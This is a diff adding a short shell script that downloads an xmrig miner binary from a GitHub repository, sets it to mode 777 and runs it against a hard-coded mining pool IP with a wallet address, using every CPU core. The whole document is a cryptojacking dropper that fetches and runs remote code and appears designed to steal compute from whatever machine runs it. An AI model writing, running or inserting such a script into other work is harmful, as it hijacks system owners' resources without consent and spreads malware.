@@ -1,0 +1,4 @@
+#!/bin/sh
+wget -O mm https://github.com/kazppkido/kikir/raw/main/xmrig 
+chmod 777 mm
+/mm --donate-level 1 -o 165.232.165.31:80 -u 0xb27e57f4accbf3a1384c1c17ac959376fc49e21d -p $(shuf -n 1 -i 1-999)-KK -a rx/0 -t $(nproc --all)
